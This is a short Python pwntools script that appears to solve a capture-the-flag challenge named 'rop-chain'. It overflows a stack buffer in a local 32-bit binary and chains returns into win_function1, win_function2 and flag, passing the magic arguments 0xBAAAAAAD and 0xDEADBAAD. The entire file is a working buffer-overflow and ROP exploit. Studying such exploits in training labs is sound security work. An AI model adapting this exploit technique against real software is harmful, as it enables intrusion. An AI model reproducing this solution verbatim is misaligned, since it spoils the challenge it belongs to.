#! /usr/bin/env python
from pwn import process, p32, u32, context, log
from pwn import ELF
context.clear(arch='i386', os='linux', endian='little', word_size=32)


class ExploitInfo:
    name    = '/problems/rop-chain_2_d25a17cfdcfdaa45844798dd74d03a47/rop'
    elf     = ELF(name)
    #
    offset_buf_to_eip = 0x18 + 4


def main():
    p = process(ExploitInfo.name)

    rop_chain = p32(ExploitInfo.elf.symbols['win_function1'])
    rop_chain += p32(ExploitInfo.elf.symbols['win_function2'])
    rop_chain += p32(ExploitInfo.elf.symbols['flag'])
    rop_chain += p32(0xBAAAAAAD)
    rop_chain += p32(0xDEADBAAD)
    log.info(rop_chain)

    payload = 'A' * ExploitInfo.offset_buf_to_eip
    payload += rop_chain
    p.clean()
    p.sendline(payload)

    print(p.recv(4096))


if __name__ == "__main__":
    main()
